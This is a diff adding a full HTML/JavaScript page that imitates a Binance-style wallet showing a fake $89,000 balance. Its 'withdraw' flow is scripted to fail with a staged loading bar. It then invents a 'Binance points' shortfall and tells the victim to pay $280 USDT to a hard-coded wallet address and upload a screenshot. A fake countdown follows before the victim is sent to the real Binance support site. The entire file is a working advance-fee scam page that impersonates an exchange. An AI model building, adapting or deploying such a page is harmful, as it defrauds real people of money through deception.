@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Wallet Dashboard - USST Withdraw Flow</title>
+  <meta name="viewport" content="width=500,initial-scale=1">
+  <style>
+    body {
+      background: #171A23;
+      color: #fff;
+      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .navbar {
+      display: flex;
+      align-items: center;
+      padding: 18px 24px 0 24px;
+      background: #1E212B;
+    }
+    .navbar .menu, .navbar .search {
+      font-size: 22px;
+      cursor: pointer;
+      color: #fff;
+    }
+    .navbar .title-tabs {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+    }
+    .navbar .title-tabs span {
+      padding: 7px 22px;
+      border-radius: 7px;
+      cursor: pointer;
+      background: #232536;
+      color: #fff;
+      font-weight: 500;
+    }
+    .navbar .title-tabs .active {
+      background: #31334a;
+      color: #f7c948;
+    }
+    .wallet-section {
+      padding: 26px 24px 10px 24px;
+      background: #171A23;
+    }
+    .wallet-top {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 8px;
+    }
+    .wallet-name {
+      font-weight: 600;
+      color: #f7c948;
+      font-size: 17px;
+      background: #232536;
+      border-radius: 6px;
+      padding: 4px 12px;
+    }
+    .wallet-balance {
+      font-size: 32px;
+      font-weight: 700;
+      margin-bottom: 14px;
+      color: #fff;
+    }
+    .action-btn {
+      background: #f7c948;
+      color: #171A23;
+      border: none;
+      font-size: 19px;
+      font-weight: 600;
+      border-radius: 8px;
+      padding: 10px 38px;
+      cursor: pointer;
+      margin-bottom: 22px;
+      transition: background 0.2s;
+    }
+    .action-btn:active {
+      background: #ffe066;
+    }
+    .quick-actions {
+      display: flex;
+      gap: 18px;
+      justify-content: center;
+      margin-bottom: 18px;
+    }
+    .quick-actions .qa-icon {
+      background: #232536;
+      color: #f7c948;
+      border-radius: 10px;
+      padding: 14px 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 15px;
+      gap: 5px;
+      cursor: pointer;
+    }
+    .notif-card {
+      background: #232536;
+      border-radius: 12px;
+      padding: 18px;
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      margin-bottom: 24px;
+    }
+    .notif-card .notif-icon {
+      font-size: 32px;
+      color: #f7c948;
+    }
+    .notif-card .notif-content {
+      flex: 1;
+    }
+    .notif-card .notif-content .claim-btn {
+      background: #f7c948;
+      color: #171A23;
+      border: none;
+      border-radius: 7px;
+      padding: 7px 18px;
+      font-weight: 600;
+      margin-top: 8px;
+      cursor: pointer;
+    }
+    .token-list-section {
+      padding: 0 24px 120px 24px;
+    }
+    .token-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 17px;
+    }
+    .token-tabs .tab {
+      padding: 7px 16px;
+      border-radius: 6px;
+      background: #232536;
+      color: #fff;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .token-tabs .active {
+      background: #f7c948;
+      color: #171A23;
+    }
+    .token-table {
+      width: 100%;
+      border-radius: 10px;
+      background: #232536;
+      padding: 16px 10px;
+      margin-bottom: 0;
+    }
+    .token-row {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #232536;
+      padding: 14px 0;
+      gap: 25px;
+      font-size: 16px;
+    }
+    .token-row:last-child {
+      border-bottom: none;
+    }
+    .token-icon {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: #f7c948;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #171A23;
+      font-weight: 700;
+      font-size: 18px;
+      margin-right: 13px;
+    }
+    .token-symbol {
+      font-weight: 600;
+      color: #fff;
+      font-size: 16px;
+      margin-right: 8px;
+    }
+    .token-balance {
+      color: #f7c948;
+      font-weight: 500;
+      margin-right: 10px;
+    }
+    .token-price {
+      color: #fff;
+      font-size: 14px;
+      margin-right: 6px;
+    }
+    .token-change {
+      font-size: 13px;
+      padding: 3px 9px;
+      border-radius: 8px;
+      background: #31334a;
+      color: #f7c948;
+    }
+    .nav-bar-bottom {
+      position: fixed;
+      left: 0; right: 0; bottom: 0;
+      background: #232536;
+      display: flex;
+      justify-content: space-around;
+      padding: 13px 0;
+      z-index: 99;
+      border-top: 1px solid #2e3043;
+    }
+    .nav-bar-bottom .nav-icon {
+      font-size: 22px;
+      color: #f7c948;
+      text-align: center;
+      cursor: pointer;
+      width: 48px;
+      height: 22px;
+      transition: color 0.2s;
+    }
+    .nav-bar-bottom .nav-icon.inactive {
+      color: #fff;
+    }
+    /* Modal Style */
+    .modal-bg {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(23,26,35,0.93);
+      z-index: 999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal {
+      background: #232536;
+      color: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 28px 0 #0008;
+      padding: 32px 22px;
+      min-width: 320px;
+      max-width: 90vw;
+      font-size: 16px;
+      text-align: center;
+      position: relative;
+    }
+    .modal h2 {
+      color: #f7c948;
+      font-size: 20px;
+      margin-bottom: 13px;
+    }
+    .modal input, .modal textarea {
+      background: #31334a;
+      color: #fff;
+      border: none;
+      border-radius: 7px;
+      padding: 8px 12px;
+      font-size: 16px;
+      margin-bottom: 13px;
+      width: 90%;
+    }
+    .modal button, .modal .yellow-btn {
+      background: #f7c948;
+      color: #171A23;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      padding: 9px 22px;
+      font-size: 16px;
+      margin-top: 12px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .modal .yellow-btn:active,
+    .modal button:active {
+      background: #ffe066;
+    }
+    .modal .copy-btn {
+      background: #31334a;
+      color: #f7c948;
+      border: none;
+      border-radius: 7px;
+      padding: 7px 14px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-left: 10px;
+      margin-top: 10px;
+    }
+    .modal .seller-list {
+      margin: 18px 0;
+      text-align: left;
+    }
+    .modal .seller-item {
+      background: #31334a;
+      color: #fff;
+      border-radius: 7px;
+      padding: 9px 13px;
+      margin-bottom: 7px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .modal .seller-item.active {
+      border: 2px solid #f7c948;
+      color: #f7c948;
+    }
+    .modal .seller-item.offline {
+      opacity: 0.6;
+    }
+    .modal .countdown {
+      font-size: 18px;
+      color: #f7c948;
+      margin: 16px 0;
+    }
+    .modal .support-btn {
+      background: #f7c948;
+      color: #171A23;
+      font-weight: 800;
+      border: none;
+      border-radius: 8px;
+      padding: 13px 28px;
+      font-size: 17px;
+      margin-top: 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      justify-content: center;
+    }
+    .modal .close {
+      position: absolute;
+      top: 10px; right: 10px;
+      background: transparent;
+      color: #fff;
+      font-size: 22px;
+      border: none;
+      cursor: pointer;
+    }
+    .modal .error {
+      color: #FF4B4B;
+      font-weight: 700;
+      margin: 12px 0;
+    }
+    @media(max-width: 560px){
+      .wallet-section, .token-list-section {padding-left:10px;padding-right:10px;}
+      .modal {padding: 14px 5px;}
+    }
+  </style>
+</head>
+<body>
+  <!-- Navbar -->
+  <div class="navbar">
+    <span class="menu">&#9776;</span>
+    <div class="title-tabs">
+      <span class="tab">Exchange</span>
+      <span class="tab active">Wallet</span>
+    </div>
+    <span class="search">&#128269;</span>
+  </div>
+
+  <!-- Wallet Info Section -->
+  <div class="wallet-section">
+    <div class="wallet-top">
+      <span class="wallet-name">Jaroslav Oumrt</span>
+    </div>
+    <div class="wallet-balance">$89,000</div>
+    <button class="action-btn" id="withdrawBtn">Withdraw</button>
+    <div class="quick-actions">
+      <div class="qa-icon"><span>&#128247;</span>Scan</div>
+      <div class="qa-icon"><span>&#128197;</span>Alpha</div>
+      <div class="qa-icon"><span>&#128214;</span>History</div>
+      <div class="qa-icon"><span>&#128176;</span>Earn</div>
+      <div class="qa-icon"><span>&#8942;</span>More</div>
+    </div>
+    <div class="notif-card">
+      <span class="notif-icon">&#128179;</span>
+      <div class="notif-content">
+        <div>Codatta Week 1–2 rewards are now claimable</div>
+        <button class="claim-btn">Claim Now</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Token List Section -->
+  <div class="token-list-section">
+    <div class="token-tabs">
+      <span class="tab">Watchlist</span>
+      <span class="tab active">BSC</span>
+      <span class="tab">Alpha</span>
+      <span class="tab">Trending</span>
+      <span class="tab">Newest</span>
+      <span class="tab">Solar</span>
+    </div>
+    <div class="token-table">
+      <!-- Only USST token -->
+      <div class="token-row">
+        <span class="token-icon">U</span>
+        <span class="token-symbol">USST</span>
+        <span class="token-balance">89,000</span>
+        <span class="token-price">$1.00</span>
+        <span class="token-change">+0.00%</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bottom Navigation -->
+  <div class="nav-bar-bottom">
+    <span class="nav-icon active">&#8962;</span>
+    <span class="nav-icon inactive">&#128200;</span>
+    <span class="nav-icon inactive">&#128179;</span>
+    <span class="nav-icon inactive">&#128269;</span>
+    <span class="nav-icon inactive">&#128188;</span>
+  </div>
+
+  <!-- Modals (Dynamic) -->
+  <div id="modalRoot"></div>
+
+  <script>
+    // Modal state
+    let modalStage = null;
+    let usdtAddress = '';
+    let agreed = false;
+    let binanceWithdrawInput = '';
+    let sellerSelected = null;
+    let pointsPaymentCopied = false;
+    let screenshotFile = null;
+    let countdownTimer = null;
+    let loadingPercent = 1;
+
+    // Helper to show modal
+    function showModal(content, allowClose=true) {
+      const modalRoot = document.getElementById('modalRoot');
+      modalRoot.innerHTML = `
+        <div class="modal-bg">
+          <div class="modal">
+            ${allowClose ? '<button class="close" onclick="closeModal()">&times;</button>' : ''}
+            ${content}
+          </div>
+        </div>
+      `;
+    }
+
+    function closeModal() {
+      document.getElementById('modalRoot').innerHTML = '';
+      modalStage = null;
+      // Reset some states
+      sellerSelected = null;
+      pointsPaymentCopied = false;
+      screenshotFile = null;
+      clearInterval(countdownTimer);
+    }
+
+    // Withdraw button click
+    document.getElementById('withdrawBtn').onclick = function() {
+      modalStage = 'withdraw-start';
+      showWithdrawAddressModal();
+    };
+
+    function showWithdrawAddressModal() {
+      showModal(`
+        <h2>Withdraw USDT</h2>
+        <div>Please enter and confirm your USDT address:</div>
+        <input type="text" id="usdtAddrInput" placeholder="USDT Address" style="margin-bottom:7px;" value="${usdtAddress}">
+        <div style="margin:10px 0;">
+          <input type="checkbox" id="agreeChk"${agreed ? ' checked' : ''}> I agree to forward <b>89,000 USDT</b> to the address provided.
+        </div>
+        <input type="text" id="confirmInput" placeholder="Type 'binance withdraw'" style="margin-bottom:7px;" value="${binanceWithdrawInput}">
+        <button onclick="handleWithdrawConfirm()">Confirm</button>
+      `);
+      document.getElementById('usdtAddrInput').addEventListener('input', e => usdtAddress = e.target.value);
+      document.getElementById('agreeChk').addEventListener('change', e => agreed = e.target.checked);
+      document.getElementById('confirmInput').addEventListener('input', e => binanceWithdrawInput = e.target.value);
+    }
+
+    window.handleWithdrawConfirm = function() {
+      // Validate fields
+      if (!usdtAddress || !agreed || binanceWithdrawInput.trim().toLowerCase() !== 'binance withdraw') {
+        showModal(`
+          <h2>Withdraw USDT</h2>
+          <div class="error">Please input your USDT address, agree to the terms, and type 'binance withdraw' to proceed.</div>
+          <button onclick="closeModal()">Close</button>
+        `);
+        return;
+      }
+      modalStage = 'loading';
+      let percent = 1;
+      loadingPercent = percent;
+      showLoadingModal(percent);
+      const interval = setInterval(() => {
+        percent += 1;
+        loadingPercent = percent;
+        showLoadingModal(percent);
+        if (percent >= 99) {
+          clearInterval(interval);
+          setTimeout(() => showWithdrawErrorModal(), 700);
+        }
+      }, 600); // 1 min from 1% to 99%: 60s/99 = ~0.6s per tick
+    };
+
+    function showLoadingModal(percent) {
+      showModal(`
+        <h2>Processing Withdraw Request</h2>
+        <div>Loading... <b>${percent}%</b></div>
+        <div style="width:100%;background:#31334a;height:16px;border-radius:8px;overflow:hidden;margin:18px 0;">
+          <div style="width:${percent}%;height:100%;background:#f7c948;"></div>
+        </div>
+      `, false);
+    }
+
+    function showWithdrawErrorModal() {
+      modalStage = 'withdraw-error';
+      showModal(`
+        <h2>WITHDRAW ERROR</h2>
+        <div class="error">NOT ENOUGH BINANCE POINTS TO CARRY OUT YOUR WITHDRAW REQUEST</div>
+        <div>LEAVING FUNDS UNCLAIMED CAN RESULT TO PERMANENT LOSS OF USDT TOKEN</div>
+        <button onclick="showGetPointsModal()">Get Points</button>
+      `);
+    }
+
+    window.showGetPointsModal = function() {
+      modalStage = 'get-points';
+      let sellers = Array.from({length: 10}, (_, i) => ({
+        name: i === 0 ? 'Online Store' : `Offline Store #${i}`,
+        active: i === 0
+      }));
+      showModal(`
+        <h2>Buy Binance Points</h2>
+        <div class="seller-list">
+          ${sellers.map((s, idx) => `
+            <div class="seller-item${s.active ? ' active' : ' offline'}" onclick="selectSeller(${idx})">
+              ${s.name}
+              <span>${s.active ? 'Online' : 'Offline'}</span>
+            </div>
+          `).join('')}
+        </div>
+      `);
+      window.selectSeller = function(idx) {
+        sellerSelected = idx;
+        if (idx === 0) showOnlineSellerModal();
+        else showOfflineSellerModal();
+      }
+    };
+
+    function showOfflineSellerModal() {
+      showModal(`
+        <h2>Seller not Active</h2>
+        <div class="error">Seller not currently Active</div>
+        <button onclick="showGetPointsModal()">Back</button>
+      `);
+    }
+
+    function showOnlineSellerModal() {
+      modalStage = 'online-seller';
+      showModal(`
+        <h2>Online Store - Binance Points</h2>
+        <div>We only have <b>7 Available BINANCE POINTS</b>. Kindly update your account and get the needed Binance requirements.<br>After which you'll be getting your payment in few seconds.</div>
+        <button class="yellow-btn" onclick="showPointsPaymentModal()">&#128994; GET BINANCE POINTS</button>
+      `);
+    }
+
+    window.showPointsPaymentModal = function() {
+      modalStage = 'points-payment';
+      showModal(`
+        <h2>Payment for Binance Points</h2>
+        <div>Payment Address:</div>
+        <div style="margin:10px 0;font-weight:bold;font-size:17px;">
+          TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa
+          <button class="copy-btn" onclick="handleCopyAddress()">Copy</button>
+        </div>
+        <div>Needed Points: <b>3000 BINANCE POINT</b></div>
+        <div>Payment Amount: <b>$280 USDT</b></div>
+        ${pointsPaymentCopied ? '<div style="color:#f7c948;margin-top:8px;">Awaiting deposit to Enable you receive your payment immediately on your personal bybit address in just few sections</div>' : ''}
+        <button onclick="showIHavePaidModal()">I have paid</button>
+      `);
+    };
+
+    window.handleCopyAddress = function() {
+      navigator.clipboard.writeText('TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa');
+      pointsPaymentCopied = true;
+      showPointsPaymentModal();
+    };
+
+    window.showIHavePaidModal = function() {
+      modalStage = 'upload-proof';
+      showModal(`
+        <h2>Upload Payment Screenshot</h2>
+        <input type="file" id="screenshotInput" accept="image/*" style="margin-bottom:10px;">
+        <button onclick="submitProof()">Submit</button>
+      `);
+      document.getElementById('screenshotInput').addEventListener('change', function(e){
+        screenshotFile = e.target.files[0];
+      });
+    };
+
+    window.submitProof = function() {
+      if (!screenshotFile) {
+        showModal(`
+          <h2>Upload Payment Screenshot</h2>
+          <div class="error">Please upload your payment screenshot before submitting.</div>
+          <button onclick="showIHavePaidModal()">Back</button>
+        `);
+        return;
+      }
+      startCountdown();
+    };
+
+    function startCountdown() {
+      let seconds = 180;
+      showModal(`
+        <h2>Processing Payment</h2>
+        <div class="countdown">Time remaining: <span id="countdownSec">${seconds}</span> seconds</div>
+      `, false);
+      countdownTimer = setInterval(() => {
+        seconds--;
+        document.getElementById('countdownSec').innerText = seconds;
+        if (seconds <= 0) {
+          clearInterval(countdownTimer);
+          showSupportModal();
+        }
+      }, 1000);
+    }
+
+    function showSupportModal() {
+      showModal(`
+        <h2>Unexpected Error Occurred</h2>
+        <div class="error">Kindly Contact the Support for assistance Regarding this Issue</div>
+        <button class="support-btn" onclick="redirectSupport()">
+          🆘 Contact Support
+        </button>
+      `);
+    }
+
+    window.redirectSupport = function() {
+      window.location.href = 'https://support.binance.com/en/contact';
+    };
+
+    // Intercept dashboard clicks for "connection timeout" error
+    document.querySelectorAll('.nav-bar-bottom .nav-icon.inactive, .qa-icon').forEach(el => {
+      el.onclick = function() {
+        showModal(`
+          <h2>Oops!</h2>
+          <div class="error">Connection timeout. Use your Binance wallet application and Confirm it.</div>
+          <button onclick="closeModal()">Close</button>
+        `);
+      }
+    });
+  </script>
+</body>
+</html>
